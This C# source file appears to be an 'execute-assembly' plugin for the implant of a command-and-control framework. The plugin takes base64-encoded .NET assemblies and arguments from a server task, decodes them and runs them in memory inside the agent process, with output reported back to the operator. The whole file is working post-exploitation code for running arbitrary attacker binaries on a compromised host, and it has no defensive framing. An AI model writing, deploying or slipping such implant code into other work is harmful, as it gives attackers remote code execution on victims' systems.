using Agent.Interfaces;
using Agent.Models;
using System.Text.Json;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "execute-assembly";
        private readonly IMessageManager messageManager;
        private readonly object stateLock = new();
        private ConsoleApplicationExecutor? executor;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            ExecuteAssemblyArgs? args;
            try
            {
                args = JsonSerializer.Deserialize<ExecuteAssemblyArgs>(job.task.parameters);
            }
            catch (JsonException exception)
            {
                messageManager.Write("Invalid arguments: " + exception.Message, job.task.id, true, "error");
                return;
            }

            if (args is null || !args.Validate())
            {
                messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
                return;
            }

            ConsoleApplicationExecutor current;
            Task execution;
            lock (stateLock)
            {
                if (executor?.IsRunning() == true)
                {
                    messageManager.Write("Task is already running", job.task.id, true, "error");
                    return;
                }

                try
                {
                    current = new ConsoleApplicationExecutor(
                        Misc.Base64DecodeToByteArray(args.asm),
                        Misc.SplitCommandLine(args.arguments),
                        job.task.id,
                        messageManager);
                    executor = current;
                    execution = current.ExecuteAsync();
                }
                catch (Exception exception)
                {
                    executor = null;
                    messageManager.Write(exception.Message, job.task.id, true, "error");
                    return;
                }
            }

            try
            {
                await execution.ConfigureAwait(false);
            }
            finally
            {
                lock (stateLock)
                {
                    if (ReferenceEquals(executor, current))
                        executor = null;
                }
            }
        }
    }
}
